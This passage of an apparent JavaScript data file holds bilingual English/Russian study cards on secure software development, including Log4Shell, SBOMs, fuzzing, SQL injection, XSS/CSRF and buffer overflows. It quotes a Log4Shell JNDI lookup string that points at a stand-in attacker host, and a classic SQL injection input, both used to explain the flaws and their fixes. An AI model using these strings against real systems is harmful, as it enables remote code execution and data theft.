      en: `<p>After SolarWinds the question became: how can a customer know that the program they install was built from the reviewed source code, on a clean build system, and nothing else?</p><ul><li><b>Provenance</b>: the build system records and signs what it built, from which commit, with which tools. Frameworks such as SLSA define levels of this.</li><li><b>Hardened, isolated builds</b>: each build runs on a fresh, short-lived machine nobody logs into.</li><li><b>Reproducible builds</b>: building the same source twice gives byte-for-byte the same result, so an independent rebuild can catch tampering.</li></ul>`,
      ru: `<p>После SolarWinds встал вопрос: как клиенту убедиться, что устанавливаемая программа собрана из проверенного исходного кода, на чистой сборочной системе, и ни из чего больше?</p><ul><li><b>Происхождение (provenance)</b>: сборочная система записывает и подписывает, что собрала, из какого коммита и какими инструментами. Уровни этого задают, например, в SLSA.</li><li><b>Укреплённые изолированные сборки</b>: каждая сборка идёт на свежей короткоживущей машине, на которую никто не входит.</li><li><b>Воспроизводимые сборки</b>: две сборки одного исходника дают побайтно одинаковый результат, и независимая пересборка может поймать подмену.</li></ul>`,
    },
    take: { en: `Signed provenance, isolated build machines, reproducible builds: evidence the build is honest.`, ru: `Подписанное происхождение, изолированные сборщики, воспроизводимые сборки — доказательства честной сборки.` } },

  { id: 's11-022', kind: 'back', back: 's06-063', k: ['d3-c7', 'd8-c4'], lvl: 2,
    title: { en: `Code signing again: who, not whether it's safe`, ru: `Снова подпись кода: кто, а не безопасно ли` },
    body: {
      en: `<p>In stage 6, Stuxnet's drivers carried signatures made with keys stolen from two real companies, and Windows trusted them.</p><p>SolarWinds is the opposite case: nothing was stolen. The backdoored update was signed by SolarWinds' own build system, with its own key, exactly as designed. The signature told customers truthfully that the file came from SolarWinds and hadn't been changed <b>since signing</b>.</p><p>That's all a code signature ever says: <b>who</b> published it and that it's intact. It says nothing about whether the code is safe. That depends on what happened before the signature, which is why the build itself needs protecting.</p>`,
      ru: `<p>На этапе 6 драйверы Stuxnet несли подписи, сделанные ключами, украденными у двух настоящих компаний, и Windows им доверяла.</p><p>SolarWinds — обратный случай: ничего не крали. Обновление с бэкдором подписала собственная сборочная система SolarWinds, своим ключом, как и было задумано. Подпись честно сообщала клиентам, что файл от SolarWinds и не менялся <b>после подписания</b>.</p><p>Это всё, что вообще говорит подпись кода: <b>кто</b> выпустил и что файл цел. О том, безопасен ли код, она ничего не говорит. Это зависит от того, что было до подписи, поэтому и саму сборку нужно защищать.</p>`,
    },
    take: { en: `A signature proves origin and integrity since signing, not that the code is safe.`, ru: `Подпись доказывает происхождение и целостность после подписания, а не безопасность кода.` } },

  { id: 's11-023', kind: 'idea', k: ['d8-c4', 'd3-c4'], lvl: 2,
    title: { en: `Compiled, interpreted, managed`, ru: `Компилируемые, интерпретируемые, управляемые` },
    body: {
      en: `<p>A <b>compiled</b> language (C, C++, Go, Rust) is turned into machine code before it runs. It's fast, and the source isn't shipped, but compiled code can still be reverse-engineered.</p><p>An <b>interpreted</b> or scripting language (Python, JavaScript) runs from source or bytecode through an interpreter, so the code is easy to read and change on the target.</p><p><b>Managed</b> runtimes (Java's JVM, .NET) sit in between: they check types, manage memory automatically and can sandbox code. That removes whole classes of bugs, such as most buffer overflows, though not logic flaws. The language choice is a security decision too.</p>`,
      ru: `<p><b>Компилируемый</b> язык (C, C++, Go, Rust) превращается в машинный код до запуска. Это быстро, и исходник не поставляется, но скомпилированный код всё равно можно разобрать обратной разработкой.</p><p><b>Интерпретируемый</b> или скриптовый язык (Python, JavaScript) выполняется из исходника или байт-кода интерпретатором, поэтому код легко прочитать и изменить на месте.</p><p><b>Управляемые</b> среды (JVM у Java, .NET) — посередине: проверяют типы, сами управляют памятью и могут помещать код в песочницу. Это убирает целые классы ошибок, например большинство переполнений буфера, но не логические. Выбор языка — тоже решение о безопасности.</p>`,
    },
    take: { en: `Managed, memory-safe runtimes remove whole bug classes; the language is a security choice.`, ru: `Управляемые среды с безопасной памятью убирают целые классы ошибок; язык — выбор безопасности.` } },

  { id: 's11-024', kind: 'vs', k: ['d6-c4'], lvl: 2,
    title: { en: `SAST vs DAST vs IAST vs RASP`, ru: `SAST, DAST, IAST и RASP` },
    body: {
      en: `<ul><li><b>SAST</b> (static testing): reads the source code without running it, like a spell checker for flaws. Early and cheap, points to the exact line, but many false positives and no view of the running setup.</li><li><b>DAST</b> (dynamic testing): attacks the running application from outside, like a scanner pointed at a website. Finds real, exploitable issues and misconfigurations, but late, and can't say which line is wrong.</li><li><b>IAST</b> (interactive): an agent inside the running app watches while tests exercise it, combining both views.</li><li><b>RASP</b> (runtime self-protection): an agent in production that <b>blocks</b> attacks as they happen. Protection, not testing.</li></ul>`,
      ru: `<ul><li><b>SAST</b> (статическое тестирование): читает исходный код без запуска, как проверка орфографии для дефектов. Рано и дёшево, указывает точную строку, но много ложных срабатываний и не видна работающая конфигурация.</li><li><b>DAST</b> (динамическое тестирование): атакует работающее приложение снаружи, как сканер, направленный на сайт. Находит реальные эксплуатируемые проблемы и ошибки настройки, но поздно и без указания строки.</li><li><b>IAST</b> (интерактивное): агент внутри работающего приложения наблюдает, пока тесты его гоняют, объединяя оба взгляда.</li><li><b>RASP</b> (самозащита во время работы): агент в продуктиве, который <b>блокирует</b> атаки в момент их совершения. Защита, а не тестирование.</li></ul>`,
    },
    take: { en: `SAST reads code, DAST attacks the running app, IAST watches from inside, RASP blocks in production.`, ru: `SAST читает код, DAST атакует работающее приложение, IAST смотрит изнутри, RASP блокирует в продуктиве.` } },

  { id: 's11-025', kind: 'idea', k: ['d6-c4', 'd8-c7', 'd1-c13'], lvl: 2,
    title: { en: `SCA and the SBOM: knowing what's inside`, ru: `SCA и SBOM: знать, что внутри` },
    body: {
      en: `<p>Most of a modern application's code wasn't written by its developers. It comes from open-source libraries, and those libraries pull in more libraries.</p><p><b>Software composition analysis (SCA)</b> lists every component a program uses, including the indirect ones, and checks them against databases of known vulnerabilities and licences.</p><p>The result can be published as a <b>software bill of materials (SBOM)</b>: an ingredients list for software, in a standard format such as SPDX or CycloneDX. US federal buyers now ask suppliers for one. Its value shows on the day a library everyone uses turns out to be broken.</p>`,
      ru: `<p>Большую часть кода современного приложения написали не его разработчики. Она приходит из библиотек с открытым кодом, а те тянут за собой другие библиотеки.</p><p><b>Анализ состава ПО (SCA)</b> перечисляет все компоненты программы, включая косвенные, и сверяет их с базами известных уязвимостей и лицензий.</p><p>Результат можно опубликовать как <b>спецификацию состава ПО (SBOM)</b>: список ингредиентов программы в стандартном формате, например SPDX или CycloneDX. Федеральные заказчики в США теперь требуют её от поставщиков. Её ценность видна в день, когда библиотека, которой пользуются все, оказывается дырявой.</p>`,
    },
    take: { en: `SCA finds every component and its known flaws; the SBOM is the ingredients list.`, ru: `SCA находит все компоненты и их известные уязвимости; SBOM — список ингредиентов.` } },

  { id: 's11-026', kind: 'story', k: ['d8-c7', 'd8-c5', 'd6-c2'], lvl: 2,
    title: { en: `Log4Shell 2021: one log line, millions of servers`, ru: `Log4Shell 2021: одна строка лога, миллионы серверов` },
    body: {
      en: `<p>Log4j is a free Java library that writes log messages. It's inside countless products, often several layers deep.</p><p>In December 2021 the world learned that if Log4j logged a string like <code>\${jndi:ldap://attacker.example/x}</code>, it would fetch and run code from that address. Anything an attacker could get logged, a username, a chat message, a browser's user-agent, became remote code execution. The flaw scored the maximum 10.0.</p><p>Patching Log4j took minutes. The hard part took weeks: finding every place it was hidden. Many organizations simply didn't know which of their systems contained it.</p>`,
      ru: `<p>Log4j — бесплатная библиотека Java для записи журналов. Она внутри бесчисленных продуктов, часто на несколько уровней вглубь.</p><p>В декабре 2021 года мир узнал: если Log4j записывал строку вроде <code>\${jndi:ldap://attacker.example/x}</code>, он загружал и выполнял код с этого адреса. Всё, что злоумышленник мог заставить попасть в журнал — имя пользователя, сообщение в чате, user-agent браузера, — превращалось в удалённое выполнение кода. Оценка — максимальные 10.0.</p><p>Обновить Log4j можно было за минуты. Трудная часть заняла недели: найти все места, где он спрятан. Многие организации просто не знали, в каких их системах он есть.</p>`,
    },
    take: { en: `The fix was easy; finding the component was hard. That's what an inventory is for.`, ru: `Исправить было легко, найти компонент — трудно. Для этого и нужна опись.` } },

  { id: 's11-027', kind: 'think', k: ['d8-c7', 'd6-c2', 'd7-c4'], lvl: 2,
    title: { en: `"Are we affected?"`, ru: `«Нас это касается?»` },
    body: {
      en: `<p>Friday, 10 December 2021. The CEO has read about Log4Shell and asks you: "Are we affected? I need an answer by Monday."</p><p>You have 600 applications, a mix of in-house code, bought products and SaaS. What do you do first?</p>`,
      ru: `<p>Пятница, 10 декабря 2021 года. Генеральный директор прочитал про Log4Shell и спрашивает: «Нас это касается? Ответ нужен к понедельнику».</p><p>У вас 600 приложений: свой код, купленные продукты и SaaS. С чего вы начнёте?</p>`,
    },
    reveal: {
      en: `<p>Treat it as an incident: open it, name an owner, and start from the <b>inventory</b>. If you have SBOMs or SCA results, search them for Log4j first; that answers your own code in hours. For bought products, check vendor advisories and ask vendors directly. Scan internally for vulnerable versions as a cross-check, not the only source.</p><p>Meanwhile, reduce exposure where you can't patch yet: block outbound connections from servers (egress filtering stops the code download), add WAF rules, and watch logs for the <code>jndi</code> pattern. Answer the CEO honestly on Monday: what's confirmed, what's fixed, what's still unknown.</p>`,
      ru: `<p>Ведите это как инцидент: откройте его, назначьте ответственного и начните с <b>описи</b>. Если есть SBOM или результаты SCA, ищите Log4j сначала там: для своего кода это ответ за часы. По купленным продуктам смотрите бюллетени поставщиков и спрашивайте их напрямую. Внутреннее сканирование уязвимых версий — перекрёстная проверка, а не единственный источник.</p><p>Тем временем снизьте риск там, где обновить пока нельзя: заблокируйте исходящие соединения серверов (фильтрация исходящего трафика срывает загрузку кода), добавьте правила WAF, следите в журналах за шаблоном <code>jndi</code>. В понедельник честно ответьте директору: что подтверждено, что исправлено, что пока неизвестно.</p>`,
    },
    take: { en: `Start from the inventory (SBOM/SCA), ask vendors, mitigate what you can't patch, report honestly.`, ru: `Начните с описи (SBOM/SCA), спросите поставщиков, смягчите то, что не обновить, отчитайтесь честно.` } },

  { id: 's11-028', kind: 'picture', k: ['d8-c7', 'd1-c13'], lvl: 2,
    title: { en: `Where Log4j was hiding`, ru: `Где прятался Log4j` },
    body: {
      en: `<p>Your developers chose a web framework. The framework uses a search engine library. That library logs with Log4j. Nobody on your team ever chose Log4j, and it doesn't appear in your project's own list of dependencies. These <b>transitive dependencies</b> are where most vulnerable components sit, and only a full SCA scan or SBOM shows them.</p>`,
      ru: `<p>Ваши разработчики выбрали веб-фреймворк. Фреймворк использует библиотеку поиска. Та пишет журналы через Log4j. Никто в команде Log4j не выбирал, и в собственном списке зависимостей проекта его нет. В таких <b>транзитивных зависимостях</b> сидит большинство уязвимых компонентов, и показывают их только полный анализ SCA или SBOM.</p>`,
    },
    dg: { title: { en: `Direct and transitive dependencies`, ru: `Прямые и транзитивные зависимости` }, h: 290,
      nodes: [
        ['app', 120, 145, { en: 'Your app', ru: 'Ваше приложение' }, { en: 'code you wrote', ru: 'ваш код' }, '🧩', 'key'],
        ['fw', 330, 80, { en: 'Web framework', ru: 'Веб-фреймворк' }, { en: 'chosen by you', ru: 'выбран вами' }, '📦', 'ok'],
        ['json', 330, 215, { en: 'JSON library', ru: 'Библиотека JSON' }, { en: 'chosen by you', ru: 'выбрана вами' }, '📦', 'ok'],
        ['search', 540, 80, { en: 'Search library', ru: 'Библиотека поиска' }, { en: 'chosen by the framework', ru: 'выбрана фреймворком' }, '📦', 'dim'],
        ['log4j', 540, 215, { en: 'Log4j 2.14', ru: 'Log4j 2.14' }, { en: 'chosen by nobody', ru: 'не выбирал никто' }, '💣', 'bad'],
      ],
      edges: [['app', 'fw', '', 'ok'], ['app', 'json', '', 'ok'], ['fw', 'search', '', 'dash'], ['search', 'log4j', '', 'bad']],
      note: { en: `Direct dependencies: what you picked. Transitive: what they picked.`, ru: `Прямые зависимости — что выбрали вы. Транзитивные — что выбрали они.` } },
    take: { en: `Most risky components are transitive: you never chose them, so only SCA/SBOM shows them.`, ru: `Большинство рискованных компонентов транзитивны: вы их не выбирали, их покажут только SCA/SBOM.` } },

  { id: 's11-029', kind: 'idea', k: ['d6-c4'], lvl: 2,
    title: { en: `Fuzzing: feed it garbage, watch it break`, ru: `Фаззинг: кормить мусором и смотреть, как ломается` },
    body: {
      en: `<p>Developers test with sensible input. Attackers use input nobody expected. <b>Fuzzing</b> automates the attacker's side: a fuzzer throws millions of malformed, random or extreme inputs at a program and records every crash or hang.</p><ul><li><b>Mutation</b> ("dumb") fuzzing takes valid samples, such as real files, and randomly changes bits.</li><li><b>Generation</b> ("smart") fuzzing builds input from a model of the format or protocol, so it gets deeper into the code.</li></ul><p>Modern fuzzers watch which code paths each input reaches and keep the inputs that open new ones. Google's OSS-Fuzz has found thousands of bugs in open-source projects this way.</p>`,
      ru: `<p>Разработчики тестируют разумным вводом. Злоумышленники — вводом, которого никто не ждал. <b>Фаззинг</b> автоматизирует сторону злоумышленника: фаззер бросает в программу миллионы искажённых, случайных или крайних входных данных и записывает каждый сбой или зависание.</p><ul><li><b>Мутационный</b> («глупый») фаззинг берёт правильные образцы, например настоящие файлы, и случайно меняет биты.</li><li><b>Генерационный</b> («умный») строит ввод по модели формата или протокола и поэтому проникает глубже в код.</li></ul><p>Современные фаззеры следят, какие пути кода достигает каждый ввод, и сохраняют те, что открывают новые. OSS-Fuzz от Google так нашёл тысячи ошибок в открытых проектах.</p>`,
    },
    take: { en: `Fuzzing automates unexpected input: mutation changes samples, generation follows the format.`, ru: `Фаззинг автоматизирует неожиданный ввод: мутационный меняет образцы, генерационный следует формату.` } },

  { id: 's11-030', kind: 'vs', k: ['d6-c4'], lvl: 1,
    title: { en: `Unit, integration, system, acceptance, regression`, ru: `Модульное, интеграционное, системное, приёмочное, регрессионное` },
    body: {
      en: `<ul><li><b>Unit test</b>: one function or class, by the developer. "Does this input check reject a negative amount?"</li><li><b>Integration test</b>: parts working together. "Does the app pass the user's identity correctly to the payment service?"</li><li><b>System test</b>: the whole system against its requirements, including security ones.</li><li><b>Acceptance test (UAT)</b>: the business confirms it does what they need, before go-live.</li><li><b>Regression test</b>: after any change, rerun earlier tests to prove nothing that used to work is now broken, including fixed security bugs.</li></ul>`,
      ru: `<ul><li><b>Модульный тест</b>: одна функция или класс, пишет разработчик. «Отклоняет ли проверка отрицательную сумму?»</li><li><b>Интеграционный тест</b>: части вместе. «Правильно ли приложение передаёт личность пользователя платёжному сервису?»</li><li><b>Системный тест</b>: вся система против требований, включая требования безопасности.</li><li><b>Приёмочный тест (UAT)</b>: бизнес подтверждает, что система делает нужное, до запуска.</li><li><b>Регрессионный тест</b>: после любого изменения повторяют прежние тесты, чтобы доказать, что ничего прежде работавшего не сломалось, включая исправленные уязвимости.</li></ul>`,
    },
    take: { en: `Unit = a piece, integration = pieces together, system = the whole, UAT = the business, regression = nothing broke.`, ru: `Модульный — часть, интеграционный — части вместе, системный — целое, UAT — бизнес, регрессия — ничего не сломалось.` } },

  { id: 's11-031', kind: 'idea', k: ['d6-c4', 'd8-c5'], lvl: 2,
    title: { en: `Code review: what the tools miss`, ru: `Ревью кода: что пропускают инструменты` },
    body: {
      en: `<p>Scanners are good at patterns: a SQL query built from strings, a weak hash function. They're poor at <b>logic</b>: a discount that can be applied twice, an order that can be shipped before it's paid, a check done on the client but not on the server.</p><p>A human reviewer catches those. Reviews range from light (a colleague reads every pull request) to formal: a <b>Fagan inspection</b> has set roles, a checklist, a meeting and recorded defects. Formal reviews are slow but find the most per hour on critical code.</p><p>Reviews also spread knowledge, and the reviewer's approval is a record of who checked what.</p>`,
      ru: `<p>Сканеры хороши в шаблонах: SQL-запрос, собранный из строк, слабая хеш-функция. Они плохи в <b>логике</b>: скидку можно применить дважды, заказ отправить до оплаты, проверку делают на клиенте, но не на сервере.</p><p>Такое ловит человек. Ревью бывают лёгкими (коллега читает каждый pull request) и формальными: <b>инспекция Фагана</b> с ролями, чек-листом, встречей и учётом дефектов. Формальные медленны, но на критичном коде находят больше всего за час.</p><p>Ревью ещё и распространяет знания, а одобрение рецензента — запись о том, кто что проверил.</p>`,
    },
    take: { en: `Tools find patterns; people find logic flaws. Formal (Fagan) review for critical code.`, ru: `Инструменты находят шаблоны, люди — логические ошибки. Формальное ревью (Фаган) — для критичного кода.` } },

  { id: 's11-032', kind: 'vs', k: ['d6-c4'], lvl: 2,
    title: { en: `Positive, negative and boundary testing`, ru: `Позитивное, негативное и граничное тестирование` },
    body: {
      en: `<ul><li><b>Positive testing</b>: valid input gives the right result. A transfer of €100 works.</li><li><b>Negative testing</b>: invalid input is rejected safely. A transfer of €−100, of "abc", or with no amount fails cleanly, with no crash and no leaked error details.</li><li><b>Boundary value analysis</b>: test at the edges, where bugs gather. If the limit is €10,000, test €9,999, €10,000 and €10,001.</li><li><b>Equivalence partitioning</b>: group inputs that should behave the same and test one from each group, instead of every value.</li></ul><p>Security bugs live mostly in negative and boundary cases, the ones developers test least.</p>`,
      ru: `<ul><li><b>Позитивное</b>: правильный ввод даёт правильный результат. Перевод 100 € работает.</li><li><b>Негативное</b>: неправильный ввод безопасно отклоняется. Перевод −100 €, «abc» или без суммы аккуратно не проходит, без сбоя и без утечки подробностей ошибки.</li><li><b>Анализ граничных значений</b>: проверка на краях, где скапливаются ошибки. Если лимит 10 000 €, проверяют 9 999, 10 000 и 10 001.</li><li><b>Разбиение на классы эквивалентности</b>: входы, которые должны вести себя одинаково, группируют и проверяют по одному из группы, а не все значения.</li></ul><p>Уязвимости живут в основном в негативных и граничных случаях — тех, что разработчики проверяют меньше всего.</p>`,
    },
    take: { en: `Test what should fail, and test at the edges: that's where security bugs live.`, ru: `Проверяйте то, что должно провалиться, и края: там живут уязвимости.` } },

  { id: 's11-033', kind: 'back', back: 's09-064', k: ['d6-c4'], lvl: 2,
    title: { en: `Synthetic transactions again: testing the interfaces`, ru: `Снова синтетические транзакции: проверка интерфейсов` },
    body: {
      en: `<p>In stage 9 a robot logged in and placed a test order every few minutes, to prove the site really worked for users.</p><p>That's one example of <b>interface testing</b>: checking the points where parts of a system meet, because that's where assumptions break. The exam lists three kinds:</p><ul><li><b>application programming interfaces (APIs)</b>: does every call check who's calling and what they send?</li><li><b>user interfaces</b>: can a hidden button or a disabled field still be triggered?</li><li><b>physical interfaces</b>: USB ports, debug connectors and console ports on devices.</li></ul>`,
      ru: `<p>На этапе 9 робот каждые несколько минут входил и делал тестовый заказ, чтобы доказать, что сайт действительно работает для пользователей.</p><p>Это пример <b>тестирования интерфейсов</b>: проверки мест, где встречаются части системы, потому что там ломаются допущения. Экзамен называет три вида:</p><ul><li><b>программные интерфейсы (API)</b>: проверяет ли каждый вызов, кто вызывает и что передаёт?</li><li><b>пользовательские интерфейсы</b>: можно ли всё же нажать скрытую кнопку или неактивное поле?</li><li><b>физические интерфейсы</b>: USB-порты, отладочные разъёмы и консольные порты устройств.</li></ul>`,
    },
    take: { en: `Interface testing covers APIs, user interfaces and physical ports: where parts meet, assumptions break.`, ru: `Тестирование интерфейсов охватывает API, UI и физические порты: где части встречаются, ломаются допущения.` } },

  { id: 's11-034', kind: 'think', k: ['d6-c4', 'd7-c3'], lvl: 2,
    title: { en: `Who signs off the tests?`, ru: `Кто подписывает результаты тестов?` },
    body: {
      en: `<p>In a reorganisation, the QA team is moved under the development manager "to speed things up". The development manager's bonus depends on releasing on time. A month later, the number of issues found in testing has dropped by half.</p><p>Good news?</p>`,
      ru: `<p>При реорганизации команду QA перевели под руководителя разработки, «чтобы ускориться». Премия руководителя разработки зависит от выпуска в срок. Через месяц число проблем, найденных при тестировании, упало вдвое.</p><p>Это хорошая новость?</p>`,
    },
    reveal: {
      en: `<p>Probably not. The code didn't get twice as good in a month. More likely, testers now report to someone who is rewarded for fewer findings, so findings get downgraded, deferred or not written down.</p><p>Testing needs <b>independence</b> from the people whose work it judges: the same reason auditors don't report to the teams they audit. Raise it with management as a conflict of interest, and check the data: compare production defects and incidents before and after. Those numbers will tell you whether quality improved or only reporting dropped.</p>`,
      ru: `<p>Скорее нет. Код не стал вдвое лучше за месяц. Вероятнее, тестировщики теперь подчиняются тому, кого награждают за меньшее число находок, и находки понижают, откладывают или не записывают.</p><p>Тестированию нужна <b>независимость</b> от тех, чью работу оно оценивает: по той же причине аудиторы не подчиняются проверяемым командам. Поднимите это перед руководством как конфликт интересов и проверьте данные: сравните дефекты и инциденты в продуктиве до и после. Эти цифры покажут, улучшилось ли качество или только упала отчётность.</p>`,
    },
    take: { en: `Testers must be independent of the developers they check; verify with production data.`, ru: `Тестировщики должны быть независимы от проверяемых разработчиков; сверяйтесь с данными продуктива.` } },

  { id: 's11-035', kind: 'idea', k: ['d8-c5'], lvl: 1,
    title: { en: `Rule one: never trust input`, ru: `Правило первое: не доверяй вводу` },
    body: {
      en: `<p>Most coding flaws come from one mistake: treating data from outside as if it were safe. "Outside" means anything the program didn't create itself: form fields, URLs, cookies, uploaded files, API calls, even data from your own database that a user once typed.</p><ul><li><b>Validate on the server</b>. Checks in the browser are a convenience; an attacker skips them.</li><li>Prefer an <b>allowlist</b>: accept only what's expected (a postcode is 5 digits), rather than trying to block everything bad.</li><li><b>Encode output</b> for where it's going: HTML, SQL, a shell command each need their own escaping.</li></ul>`,
      ru: `<p>Большинство дефектов кода — из одной ошибки: данные извне считают безопасными. «Извне» — всё, что программа не создала сама: поля форм, URL, cookie, загруженные файлы, вызовы API, даже данные из собственной базы, которые когда-то ввёл пользователь.</p><ul><li><b>Проверяйте на сервере</b>. Проверки в браузере — удобство; злоумышленник их обходит.</li><li>Предпочитайте <b>белый список</b>: принимайте только ожидаемое (индекс — 6 цифр), а не пытайтесь заблокировать всё плохое.</li><li><b>Кодируйте вывод</b> под то место, куда он идёт: HTML, SQL, команда оболочки — у каждого своё экранирование.</li></ul>`,
    },
    take: { en: `Treat all outside data as hostile: validate on the server with allowlists, encode on output.`, ru: `Считайте все внешние данные враждебными: проверка на сервере по белому списку, кодирование вывода.` } },

  { id: 's11-036', kind: 'story', k: ['d8-c5', 'd8-c6'], lvl: 2,
    title: { en: `Heartland 2008: one web form, 130 million cards`, ru: `Heartland 2008: одна веб-форма, 130 миллионов карт` },
    body: {
      en: `<p>Heartland Payment Systems processed card payments for hundreds of thousands of US merchants. In 2008, attackers found a web form on one of its sites that passed what users typed straight into a database query: <b>SQL injection</b>.</p><p>That gave them a foothold. From there they worked their way into the payment network and installed software that captured card data as it passed through. About 130 million cards were exposed, then one of the largest breaches ever. The leader of the group, Albert Gonzalez, was sentenced to 20 years in prison. Heartland paid well over $100 million in settlements.</p>`,
      ru: `<p>Heartland Payment Systems обрабатывала карточные платежи сотен тысяч американских продавцов. В 2008 году злоумышленники нашли на одном из её сайтов веб-форму, передававшую введённое пользователем прямо в запрос к базе данных: <b>SQL-инъекцию</b>.</p><p>Это дало точку опоры. Оттуда они пробрались в платёжную сеть и установили программу, перехватывавшую данные карт на лету. Под угрозой оказалось около 130 миллионов карт — тогда одна из крупнейших утечек в истории. Лидер группы, Альберт Гонсалес, получил 20 лет тюрьмы. Heartland выплатила по соглашениям намного больше 100 миллионов долларов.</p>`,
    },
    take: { en: `One unvalidated form field opened the door to a whole payment network.`, ru: `Одно непроверенное поле формы открыло дверь во всю платёжную сеть.` } },

  { id: 's11-037', kind: 'picture', k: ['d8-c5', 'd8-c6'], lvl: 2,
    title: { en: `SQL injection, and the fix`, ru: `SQL-инъекция и исправление` },
    body: {
      en: `<p>When a query is built by gluing text together, the user's input becomes part of the <b>command</b>. With a <b>parameterized query</b> (prepared statement), the command is fixed first and the input is passed separately, always treated as data, never as code. Least-privilege database accounts limit the damage if something still gets through.</p>`,
      ru: `<p>Когда запрос собирают склейкой текста, ввод пользователя становится частью <b>команды</b>. В <b>параметризованном запросе</b> (подготовленном выражении) команда задаётся сначала, а ввод передаётся отдельно и всегда считается данными, никогда кодом. Учётки БД с минимальными правами ограничивают ущерб, если что-то всё же пройдёт.</p>`,
    },
    dg: { title: { en: `Concatenated vs parameterized query`, ru: `Склеенный и параметризованный запрос` }, h: 290,
      zones: [[20, 20, 720, 120, { en: 'String concatenation', ru: 'Склейка строк' }, 'untrust'], [20, 160, 720, 120, { en: 'Parameterized query', ru: 'Параметризованный запрос' }, 'trust']],
      nodes: [
        ['in1', 130, 90, { en: "x' OR '1'='1", ru: "x' OR '1'='1" }, { en: 'typed in the form', ru: 'введено в форму' }, '⌨️', 'bad'],
        ['q1', 400, 90, { en: 'WHERE name=\'x\' OR \'1\'=\'1\'', ru: 'WHERE name=\'x\' OR \'1\'=\'1\'' }, { en: 'input became code', ru: 'ввод стал кодом' }, '🧨', 'bad', 260],
        ['r1', 650, 90, { en: 'Every row', ru: 'Все строки' }, '', '📤', 'bad'],
        ['in2', 130, 230, { en: "x' OR '1'='1", ru: "x' OR '1'='1" }, { en: 'same input', ru: 'тот же ввод' }, '⌨️', 'dim'],
        ['q2', 400, 230, { en: 'WHERE name = ?', ru: 'WHERE name = ?' }, { en: 'input stays data', ru: 'ввод остаётся данными' }, '🛡️', 'ok', 260],
        ['r2', 650, 230, { en: 'No match', ru: 'Нет совпадений' }, '', '✅', 'ok'],
      ],
      edges: [['in1', 'q1', '', 'bad'], ['q1', 'r1', '', 'bad'], ['in2', 'q2', '', 'ok'], ['q2', 'r2', '', 'ok']],
      note: { en: `Escaping helps; parameters are the real fix.`, ru: `Экранирование помогает; настоящее исправление — параметры.` } },
    take: { en: `Parameterized queries keep input as data; that's the fix for SQL injection.`, ru: `Параметризованные запросы держат ввод данными; это исправление SQL-инъекции.` } },

  { id: 's11-038', kind: 'back', back: 's09-016', k: ['d8-c5', 'd6-c6'], lvl: 2,
    title: { en: `MOVEit again: it was SQL injection`, ru: `Снова MOVEit: это была SQL-инъекция` },
    body: {
      en: `<p>In stage 9, MOVEit Transfer was the zero-day no scanner knew about: in 2023 the Cl0p group stole files from thousands of organizations through it.</p><p>The flaw itself was old-fashioned: <b>SQL injection</b> in the web application, the same class of bug as Heartland fifteen years earlier. A file-transfer product built to move sensitive data safely was undone by a query that trusted its input.</p><p>Two lessons sit side by side. For builders: the classic weaknesses aren't solved, they're just well known. For buyers: a product's own security promises don't replace your monitoring and your ability to react fast.</p>`,
      ru: `<p>На этапе 9 MOVEit Transfer был уязвимостью нулевого дня, о которой не знал ни один сканер: в 2023 году группа Cl0p украла через него файлы тысяч организаций.</p><p>Сам дефект был старомодным: <b>SQL-инъекция</b> в веб-приложении, тот же класс ошибок, что у Heartland пятнадцатью годами раньше. Продукт для безопасной передачи чувствительных файлов подвёл запрос, доверявший вводу.</p><p>Рядом два урока. Для тех, кто пишет: классические слабости не решены, они просто хорошо известны. Для тех, кто покупает: обещания продукта не заменяют вашего мониторинга и умения быстро реагировать.</p>`,
    },
    take: { en: `Classic flaws still ship in security products; builders must test, buyers must still monitor.`, ru: `Классические дефекты всё ещё попадают в защитные продукты; авторам — тестировать, покупателям — следить.` } },

  { id: 's11-039', kind: 'vs', k: ['d8-c5'], lvl: 2,
    title: { en: `XSS vs CSRF`, ru: `XSS и CSRF` },
    body: {
      en: `<ul><li><b>Cross-site scripting (XSS)</b>: the attacker's script runs <b>in the victim's browser</b>, inside a trusted site, because the site echoed input without encoding it. <i>Stored</i>: saved on the site, such as a comment. <i>Reflected</i>: bounced back from a crafted link. <i>DOM-based</i>: created by the page's own JavaScript. Fix: encode output, plus a Content Security Policy.</li><li><b>Cross-site request forgery (CSRF)</b>: a different site makes the victim's browser send a request <b>to a site where they're logged in</b>, using their cookie. "Transfer €500." Fix: anti-CSRF tokens and SameSite cookies.</li></ul><p>Rule: XSS abuses the user's trust in the site; CSRF abuses the site's trust in the user's browser.</p>`,
      ru: `<ul><li><b>Межсайтовый скриптинг (XSS)</b>: скрипт злоумышленника выполняется <b>в браузере жертвы</b> внутри доверенного сайта, потому что сайт вернул ввод без кодирования. <i>Хранимый</i>: сохранён на сайте, например в комментарии. <i>Отражённый</i>: возвращён из подготовленной ссылки. <i>DOM-based</i>: создан JavaScript самой страницы. Защита: кодирование вывода плюс Content Security Policy.</li><li><b>Подделка межсайтового запроса (CSRF)</b>: чужой сайт заставляет браузер жертвы отправить запрос <b>на сайт, где она вошла</b>, с её cookie. «Перевести 500 €». Защита: anti-CSRF-токены и cookie SameSite.</li></ul><p>Правило: XSS злоупотребляет доверием пользователя к сайту, CSRF — доверием сайта к браузеру пользователя.</p>`,
    },
    take: { en: `XSS: user trusts the site. CSRF: site trusts the browser.`, ru: `XSS: пользователь доверяет сайту. CSRF: сайт доверяет браузеру.` } },

  { id: 's11-040', kind: 'idea', k: ['d8-c5', 'd3-c4'], lvl: 2,
    title: { en: `Buffer overflows and memory safety`, ru: `Переполнение буфера и безопасность памяти` },
    body: {
      en: `<p>In languages like C and C++, the programmer manages memory. If a program copies 200 bytes into a space for 100, the extra bytes overwrite whatever comes next, possibly the address the program will jump to. A crafted input can make it jump to the attacker's code. That's a <b>buffer overflow</b>.</p><p>Defences: check lengths, use safe functions, and let the operating system help (non-executable memory, address randomization). The deeper fix is <b>memory-safe languages</b> such as Rust, Go, Java or C#. Microsoft and Google have each reported that about 70% of their serious security bugs were memory-safety bugs.</p>`,
      ru: `<p>В языках вроде C и C++ памятью управляет программист. Если программа копирует 200 байт в место на 100, лишние байты затирают то, что лежит дальше, возможно адрес, куда программа перейдёт. Подготовленный ввод может заставить её перейти к коду злоумышленника. Это <b>переполнение буфера</b>.</p><p>Защита: проверять длины, использовать безопасные функции и позволить ОС помочь (неисполняемая память, рандомизация адресов). Более глубокое решение — <b>языки с безопасной памятью</b>: Rust, Go, Java или C#. Microsoft и Google сообщали, что около 70% их серьёзных уязвимостей были ошибками безопасности памяти.</p>`,
    },
